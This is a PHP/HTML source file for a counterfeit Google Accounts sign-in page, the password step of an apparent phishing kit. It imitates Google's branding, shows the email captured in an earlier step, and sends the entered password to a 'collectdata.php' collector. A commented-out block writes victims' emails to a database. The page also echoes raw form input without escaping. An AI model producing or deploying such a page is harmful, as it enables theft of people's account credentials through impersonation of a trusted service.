<html>
<title>Sign in - Google Accounts</title>

<head>
	<link href="style1.css" rel="stylesheet">
</head>
<?php
require('dbconnect.php');
// if (isset($_POST['nextBtn'])) {
// 	session_start();
// 	$email_input = $_POST['emailinput'];
// 	$_SESSION['emailinput'] = $_POST['emailinput'];
// 	$query = $con->prepare("INSERT INTO `user`(`email_or_phone`) VALUES (?)");
// 	$query->bind_param('s', $email_input); //bind the parameters
// 	$query->execute();
// }
session_start();
$_SESSION['emailinput'] = $_POST['emailinput'];
?>
<body>
	
<script>
		function togglePW() {
	var x = document.getElementById("passwordInput");
	if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}	
	</script>
	<center>

		<div id="form1">
			<div id="logo">
				<img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" width="80"
					height="26" />
			</div>
			<p id="welcome">Welcome</p>
            <div id="box1">
            <img id=profile src="https://img.icons8.com/?size=512&id=84898&format=png" width="20"
					height="20" />
			<p id="email"><?php echo $_SESSION['emailinput']; ?></p>
            </div>
			<div id="mailbox">
				<form action="collectdata.php" method=POST>
					<input placeholder="Enter your password" type="password" name="passwordinput" id="passwordInput"style="width:360px; height:52px; border: solid 1px #c2c4c6; 
				font-size:14px; padding-left:8px; margin-top:25px; border-radius: 2px; margin-left: -45px" required />
			</div>
			<input type="checkbox" id="showPassword" onclick="togglePW()" style="margin-top:45px; margin-left: -370px"/>
			<label style="font-size: 14px; margin-left: 10px;" for="showPassword">Show password</label>
				
			<div id="tryanotherway"><a href="#" />Try another way</a></div>
			<div><input type="submit" name="nextBtn" id="nextBtn2" value="Next" /></div>
			</form>
		</div>
	</center>

</body>
</html>




